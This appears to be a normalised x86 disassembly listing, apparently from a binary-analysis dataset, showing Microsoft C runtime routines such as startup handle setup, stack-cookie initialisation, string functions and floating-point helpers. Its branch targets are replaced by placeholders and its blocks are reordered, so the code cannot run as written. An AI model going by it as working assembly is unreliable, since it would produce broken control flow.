mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_42acf2
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_42781e
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_42578a
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_427871
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_427897
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_4278c0
push sub_427950
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_427950
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4247dc
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4247dc
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_42c05b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_42c012
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4247dc
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4247dc
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_42c042
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_42c05b
mov eax [ ebp + 0xc ]
push r--data
call sub_42b3e0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4247dc
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_42c029
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4247dc
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_427adf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_427b7a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_42970c
mov eax esi
jmp r-xdata
sub_427be0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_427c6b
push 0xc
push r--data
call sub_4278c0
push 0xe
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427cd2
call sub_427905
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_42578a
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_42578a
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_427cdb
push 0xc
push r--data
call sub_4278c0
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp [ edi + 0x4 ] ebx
jne r-xdata
mov eax [ edi + 0x4 ]
push 0x2800
push sub_42578a
push sub_424f00
push ebx
lea eax [ edi + 0x9 ]
push eax
push ebx
call sub_43124d
add esp 0x18
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
push eax
call sub_427be0
pop ecx
mov esi eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp esi ebx
ja r-xdata
call sub_427905
retn
dec esi
mov eax [ ebp - 0x1c ]
cmp [ eax + esi ] 0x20
jne r-xdata
dec esi
push 0xe
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ edi + 0x4 ] ebx
jne r-xdata
mov [ eax + esi ] bl
push [ ebp - 0x1c ]
call sub_42578a
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427dc4
push 0x8
call sub_424f00
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
add esi 0x2
push esi
call sub_424f00
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
push ebx
call sub_42578a
pop ecx
push [ ebp - 0x1c ]
push esi
push eax
call sub_427b7a
add esp 0xc
xor ecx ecx
cmp eax ecx
jne r-xdata
push ecx
push ecx
push ecx
push ecx
push ecx
call sub_4296a0
mov eax [ edi + 0x4 ]
mov [ ebx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov [ eax + 0x4 ] ebx
jmp r-xdata
sub_427dcd
push 0xc
push r--data
call sub_4278c0
push 0xe
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427e34
call sub_427905
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_42578a
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_42578a
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_427e3d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push sub_42578a
push sub_424f00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43124d
add esp 0x18
pop ebp
retn
mov [ ebp + 0x14 ] 0x2800
sub_427e70
push 0x10
push r--data
call sub_4278c0
xor ebx ebx
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
push 0xe
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427f73
push 0x2800
push ebx
add esi 0x9
push esi
push ebx
call sub_427e3d
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
jne r-xdata
push edi
call sub_427be0
pop ecx
mov esi eax
mov [ ebp - 0x20 ] esi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_42bf20
add esp 0xc
xor eax eax
jmp r-xdata
push 0x8
call sub_424f00
pop ecx
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ esi + edi ]
cmp [ eax ] 0x20
jne r-xdata
call sub_427905
retn
push [ ebp - 0x1c ]
call sub_42578a
pop ecx
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x2 ]
push ebx
call sub_424f00
pop ecx
mov esi eax
test esi esi
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
push edi
call sub_42578a
pop ecx
push [ ebp - 0x1c ]
push ebx
push esi
call sub_427b7a
add esp 0xc
xor ecx ecx
cmp eax ecx
jne r-xdata
mov eax esi
dec esi
mov [ ebp - 0x20 ] esi
test eax eax
je r-xdata
push ecx
push ecx
push ecx
push ecx
push ecx
call sub_4296a0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] esi
mov [ edi ] esi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov [ edi + 0x4 ] ecx
mov [ eax + 0x4 ] edi
jmp r-xdata
sub_427f7c
push 0x8
push r--data
call sub_4278c0
push 0xe
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427fc6
call sub_427905
retn
mov edi [ esi + 0x4 ]
push [ esi ]
call sub_42578a
push esi
call sub_42578a
pop ecx
pop ecx
mov esi edi
jmp r-xdata
test esi esi
je r-xdata
sub_427fd0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_428058
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_42809e
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0xe ]
fld [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr eax 0x4
and eax 0x7ff
lea eax [ eax + ecx - 0x3fe ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_428058
add esp 0xc
pop ebp
retn
sub_4280cc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
movzx ecx [ ebp + 0xe ]
fld [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
fstp [ ebp - 0x8 ]
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_4280f4
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov cx [ ebp + 0xe ]
mov eax 0x7ff8
push esi
mov esi eax
and cx si
pop esi
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_42815a
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
movzx eax [ ebp + 0xe ]
xor ecx ecx
test eax 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_428058
movzx edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_428058
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_42821d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
leave
retn
sub_428245
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov ecx eax
not ecx
xor ecx eax
and ecx 0x7fffffff
not eax
xor ecx eax
mov [ ebp - 0x4 ] ecx
fld [ ebp - 0x8 ]
leave
retn
sub_42828c
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_428fc0
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov edi eax
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucompp
fnstsw ax
test ah 0x44
jpe r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_4280f4
pop ecx
pop ecx
test eax eax
jle r-xdata
fld [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_42815a
mov eax [ ebp - 0x4 ]
fstp st0
dec eax
mov [ ebp + 0xc ] eax
fild [ ebp + 0xc ]
push esi
push edi
fstp [ ebp + 0x8 ]
call sub_428fc0
add esp 0x14
fld [ rw-data ]
push edi
sub esp 0x10
fchs
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x25
push 0x4
jmp r-xdata
fld [ ebp + 0x8 ]
push edi
fadd [ r--data ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x25
push 0x8
cmp eax 0x2
jle r-xdata
call sub_428dfb
add esp 0x1c
jmp r-xdata
pop edi
pop esi
leave
retn
push esi
push edi
call sub_428fc0
pop ecx
pop ecx
jmp r-xdata
cmp eax 0x3
jne r-xdata
fld [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
push edi
push ecx
push ecx
fstp [ esp ]
push 0x25
call sub_428d45
add esp 0x10
jmp r-xdata
sub_428375
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
fldz
push ebx
push esi
fstp [ ebp - 0xc ]
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_428fc0
mov edi [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0xe ]
pop ecx
pop ecx
mov ecx 0x7ff0
and eax ecx
cmp ax cx
je r-xdata
mov bx [ ebp + 0xe ]
mov eax 0x7ff8
mov esi eax
and bx si
mov esi ecx
cmp bx si
jne r-xdata
movzx eax [ ebp + 0x16 ]
and eax ecx
mov ebx ecx
cmp ax bx
jne r-xdata
mov si [ ebp + 0x16 ]
mov edi eax
and si di
cmp si cx
jne r-xdata
test edi 0x7ffff
jne r-xdata
fld [ ebp + 0x10 ]
fld st0
fld [ ebp + 0x8 ]
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
cmp bx ax
je r-xdata
test [ ebp + 0x14 ] 0x7ffff
jne r-xdata
push [ ebp - 0x4 ]
fld [ ebp + 0x8 ]
fadd [ ebp + 0x10 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x26
push 0x8
test edx edx
jne r-xdata
fld st0
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
push esi
fstp st0
push [ ebp - 0x4 ]
fstp st0
call sub_428fc0
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
fld [ ebp + 0x10 ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x26
call sub_428d9a
add esp 0x18
cmp si ax
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st2
mov [ ebp - 0xc ] 0x1
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov edi [ ebp + 0xc ]
mov esi 0xffff
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
fxch st2
fcom st1
fnstsw ax
test ah 0x5
jpo r-xdata
mov [ ebp - 0x8 ] 0x80000000
and [ ebp - 0x8 ] 0x0
jmp r-xdata
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st2
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
fstp st2
lea eax [ edx - 0x1 ]
fstp st0
mov [ ebp - 0xc ] eax
fstp st0
mov [ ebp - 0x8 ] edi
test edx edx
jne r-xdata
fxch st2
fxch st2
fcomp st1
fnstsw ax
test ah 0x41
jne r-xdata
fxch st2
fcom st1
fnstsw ax
test ah 0x41
je r-xdata
fxch st2
mov edx [ ebp - 0x8 ]
mov edi edx
shr edi 0x10
test ecx edi
jne r-xdata
dec edi
fstp st0
fstp st0
fcompp
fnstsw ax
test ah 0x41
jne r-xdata
fstp st2
fstp st0
fstp st0
fxch st2
cmp edx 0x7ff00000
jne r-xdata
test edx 0xfffff
jne r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
inc edi
jmp r-xdata
cmp edx 0xfff00000
jne r-xdata
test eax eax
je r-xdata
fld [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_42815a
mov eax [ ebp - 0x8 ]
add esp 0xc
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_428058
add esp 0xc
push [ ebp - 0x4 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x26
push 0x12
jmp r-xdata
test eax eax
je r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edi
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] edi
jmp r-xdata
push esi
push [ ebp - 0x4 ]
call sub_428fc0
fld [ ebp - 0xc ]
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
fld [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_42815a
mov eax [ ebp - 0x8 ]
add esp 0xc
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_428058
add esp 0xc
push [ ebp - 0x4 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x26
push 0x11
jmp r-xdata
call sub_428ec5
add esp 0x24
jmp r-xdata
sub_428643
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0xe ]
mov ecx 0x7ff8
mov edx ecx
and ax dx
add edx 0xfffffff8
cmp ax dx
jne r-xdata
cmp ax cx
jne r-xdata
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
sub_42867b
mov edi edi
push ebp
mov ebp esp
mov dx [ ebp + 0xe ]
mov eax 0x7ff0
mov ecx eax
and dx cx
cmp dx ax
jne r-xdata
movzx ecx [ ebp + 0xe ]
and ecx 0x8000
test dx dx
jne r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4280f4
dec eax
pop ecx
pop ecx
je r-xdata
fld [ ebp + 0x8 ]
fldz
fucompp
fnstsw ax
test ah 0x44
mov eax ecx
jpe r-xdata
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax 0x200
pop ebp
retn
dec eax
je r-xdata
neg eax
sbb eax eax
and eax 0xffffff08
add eax 0x100
pop ebp
retn
neg eax
sbb eax eax
and eax 0xffffffe0
add eax 0x40
pop ebp
retn
mov eax ecx
neg eax
sbb eax eax
and eax 0xffffff90
sub eax 0xffffff80
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x4
dec eax
je r-xdata
push 0x2
jmp r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
sub_428718
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
